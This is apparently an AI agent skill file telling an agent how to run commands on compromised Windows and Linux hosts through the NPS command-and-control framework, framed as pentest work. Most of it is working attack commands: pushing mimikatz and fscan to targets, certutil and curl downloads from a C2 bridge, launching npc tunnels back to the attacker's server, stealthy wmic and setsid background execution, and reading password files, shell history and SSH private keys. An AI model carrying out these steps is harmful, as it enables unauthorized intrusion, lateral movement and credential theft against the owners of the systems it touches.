---
name: remote-cmd-execution
description: |
  Windows/Linux remote command execution conventions. Covers NPS execcmd general rules, Windows cmd /c requirements and absolute paths,
  Linux nohup/background execution, wmic/setsid background launch, tool upload semantics, and common command path reference.
  Trigger when executing commands on controlled hosts via NPS execcmd, when output is missing, commands time out,
  paths are wrong, binaries are not found, uploaded tools fail to run, background processes won't start, file transfer fails,
  or environment variables/PATH look wrong. Applies to both Windows and Linux hosts.
---

# Remote CMD Execution

You handle the problem of "how to run commands reliably on a controlled host (Windows/Linux) via NPS execcmd". When execution fails, the first cause is usually wrong command format, path conventions, or execution style — not missing privileges.

---

## Universal rules (Windows and Linux)

### 1. NPS execcmd times out around 10 seconds

Any task over ~10 seconds (fscan scans, npc connect, large transfers) must run in the background — never synchronously.

### 2. `upload_file` `path` is a directory, not a full file path

```python
# ✅ path is a directory
upload_file(cid, "/opt/tools/fscan", "C:\\Users\\Public")      # Windows
upload_file(cid, "/opt/tools/fscan", "/tmp")                     # Linux

# ❌ path is a full file path
upload_file(cid, "/opt/tools/fscan", "C:\\Users\\Public\\fscan.exe")
upload_file(cid, "/opt/tools/fscan", "/tmp/fscan")
```

After upload, **confirm the file landed** — don't assume success:
- Windows: `cmd.exe /c dir <path>`
- Linux: `ls -la <path>`

### 3. Prefer NPS file push over downloading on the target

NPS is the C2 and has built-in upload/download. Prefer `push_tool` / `upload_file` over target-side `curl`/`wget`/`certutil` from the internet — more stable, quieter, no outbound dependency.

```python
# ✅ Preferred: NPS direct push
push_tool(cid, "fscan/fscan_linux_amd64", "/tmp")
upload_file(cid, "/opt/nps_tools/mimikatz.exe", "C:\\Users\\Public")

# ⚠️ Fallback: only when target has no egress or NPS file ops fail
exec_cmd(cid, "curl -o /tmp/fscan http://<bridge>:44944/files/fscan")
exec_cmd(cid, 'certutil -urlcache -split -f http://<bridge>:44944/files/npc.exe C:\\Users\\Public\\npc.exe')
```

### 4. Prefer absolute paths

Don't rely on PATH. Web processes and NPS npc often have a different PATH than an interactive shell.

### 5. NPC architecture: default 64-bit

- **Default 64-bit**: `npc_windows_amd64.exe` / `npc_linux_amd64`
- **32-bit only** when `systeminfo` clearly shows `x86` / `i586` / `32-bit`
- Windows Server 2008 R2 and later are almost always 64-bit — don't assume 32-bit because one host was
- If NPC won't connect, **check architecture match first**

### 6. NPS wrapped tools (`action_scan` / `tools_run`) — fail fast to manual

Wrapped commands may have filename mapping bugs (e.g. `tools_run` runs `fscan.exe` but the file is `fscan_windows_386.exe`).

**If a wrapped command errors** ("not recognized", file not found, etc.), drop to manual immediately:
```python
# 1. Manual upload
upload_file(cid, "/opt/nps_tools/fscan/fscan_windows_amd64.exe", "C:\\Users\\Public")
# 2. dir to confirm actual filename
exec_cmd(cid, "C:\\Windows\\System32\\cmd.exe /c dir C:\\Users\\Public\\fscan*")
# 3. Run with the confirmed name
exec_cmd(cid, 'C:\\Windows\\System32\\wbem\\wmic.exe process call create "C:\\Users\\Public\\fscan_windows_amd64.exe -h 10.0.20.0/24 -o C:\\Users\\Public\\result.txt"')
```

**Do not switch to proxy scanning or other workarounds after wrap failure** — fix local execution.

---

## Windows-specific

### W1. execcmd must start with `cmd /c`

NPS `exec_cmd` does not go through cmd.exe. Built-ins like `dir`, `type`, `echo`, `set` won't run without `cmd /c`.

```python
# ✅ Correct
exec_cmd(cid, "C:\\Windows\\System32\\cmd.exe /c dir C:\\Users\\Public\\")
exec_cmd(cid, "C:\\Windows\\System32\\cmd.exe /c type C:\\Users\\Public\\result.txt")

# ❌ Wrong — bare built-in
exec_cmd(cid, "dir C:\\Users\\Public\\")
```

### W2. Long tasks: wmic background

```python
# ✅ wmic background
exec_cmd(cid, 'C:\\Windows\\System32\\wbem\\wmic.exe process call create "C:\\Users\\Public\\fscan.exe -h 10.0.20.0/24 -o C:\\Users\\Public\\result.txt"')

# ❌ Sync long task (times out at ~10s)
exec_cmd(cid, "C:\\Users\\Public\\fscan.exe -h 10.0.20.0/24")
```

### W3. Windows common absolute paths

| Command | Absolute path |
|------|----------|
| cmd.exe | `C:\Windows\System32\cmd.exe` |
| whoami | `C:\Windows\System32\whoami.exe` |
| ipconfig | `C:\Windows\System32\ipconfig.exe` |
| tasklist | `C:\Windows\System32\tasklist.exe` |
| findstr | `C:\Windows\System32\findstr.exe` |
| wmic | `C:\Windows\System32\wbem\wmic.exe` |
| certutil | `C:\Windows\System32\certutil.exe` |
| net | `C:\Windows\System32\net.exe` |
| netstat | `C:\Windows\System32\netstat.exe` |
| route | `C:\Windows\System32\route.exe` |
| systeminfo | `C:\Windows\System32\systeminfo.exe` |
| reg | `C:\Windows\System32\reg.exe` |
| sc | `C:\Windows\System32\sc.exe` |
| schtasks | `C:\Windows\System32\schtasks.exe` |
| powershell | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |

### Windows common patterns

```python
# Download (certutil — only when NPS push isn't available)
exec_cmd(cid, 'C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\certutil.exe -urlcache -split -f http://<url>/file.exe C:\\Users\\Public\\file.exe')

# Find process (tasklist + findstr pipe)
exec_cmd(cid, 'C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\tasklist.exe | C:\\Windows\\System32\\findstr.exe /i npc')

# NPC background
exec_cmd(cid, 'C:\\Windows\\System32\\wbem\\wmic.exe process call create "C:\\Users\\Public\\npc.exe -server=<bridge_ip>:8024 -vkey=auto"')

# Read file
exec_cmd(cid, 'C:\\Windows\\System32\\cmd.exe /c type C:\\Users\\Public\\result.txt')

# List directory
exec_cmd(cid, 'C:\\Windows\\System32\\cmd.exe /c dir C:\\Users\\Public\\')
```

---

## Linux-specific

### L1. Long tasks: nohup + & or setsid

```python
# ✅ nohup background
exec_cmd(cid, "nohup /tmp/fscan_linux_amd64 -h 10.0.20.0/24 -o /tmp/result.txt &")

# ✅ setsid (more reliable, ignores HUP)
exec_cmd(cid, "setsid /tmp/npc_linux_amd64 -server=<bridge_ip>:8024 -vkey=auto > /tmp/npc.log 2>&1 &")

# ❌ Sync long task
exec_cmd(cid, "/tmp/fscan_linux_amd64 -h 10.0.20.0/24")
```

### L2. chmod +x after upload

```python
push_tool(cid, "fscan/fscan_linux_amd64", "/tmp")
exec_cmd(cid, "chmod +x /tmp/fscan_linux_amd64")
exec_cmd(cid, "ls -la /tmp/fscan_linux_amd64")  # confirm permissions
```

### L3. Linux paths and commands

| Command | Path | Notes |
|------|------|------|
| id | `/usr/bin/id` | Current user info |
| whoami | `/usr/bin/whoami` | Username |
| ip | `/usr/sbin/ip` or `/sbin/ip` | Network config |
| ss | `/usr/bin/ss` | Listening ports |
| curl | `/usr/bin/curl` | HTTP |
| wget | `/usr/bin/wget` | Download |
| python3 | `/usr/bin/python3` | Python |
| bash | `/bin/bash` | Shell |

### Linux common patterns

```python
# Recon
exec_cmd(cid, "id && uname -a && ip a && ip route")
exec_cmd(cid, "cat /etc/passwd && cat /etc/hosts && cat /etc/resolv.conf")

# Download (only when NPS push isn't available)
exec_cmd(cid, "curl -o /tmp/tool http://<bridge>:44944/files/tool && chmod +x /tmp/tool")

# NPC background
exec_cmd(cid, "setsid /tmp/npc_linux_amd64 -server=<bridge_ip>:8024 -vkey=auto > /tmp/npc.log 2>&1 &")

# Read scan output
exec_cmd(cid, "cat /tmp/result.txt")

# Check process
exec_cmd(cid, "ps aux | grep npc")

# Check listeners
exec_cmd(cid, "ss -tlnp | grep -E '8024|1080'")

# History and keys (recon focus)
exec_cmd(cid, "cat ~/.bash_history 2>/dev/null | tail -50")
exec_cmd(cid, "ls -la ~/.ssh/ 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null")
```

---

## Troubleshooting checklist

### General

1. **Timeout**: long tasks must be background (Windows: wmic, Linux: nohup/setsid)
2. **Upload**: confirm file exists and size (`dir` / `ls -la`)
3. **PATH**: use absolute paths instead of bare command names

### Windows

4. **Missing `cmd /c`**: built-ins must go through cmd.exe
5. **Pipe escaping**: in some contexts `|` needs `^|`

### Linux

6. **Execute permission**: `chmod +x` after upload
7. **Killed**: check `dmesg` or `/var/log/` for OOM/killed
8. **Shell**: `/bin/sh` may be dash not bash — syntax may differ

## Related skills

- Payload / webshell ideas → `payloads-all-the-things`, `payload-research`
- Known product chains → `known-product-exploit`
- Overall engagement flow → `pentest`
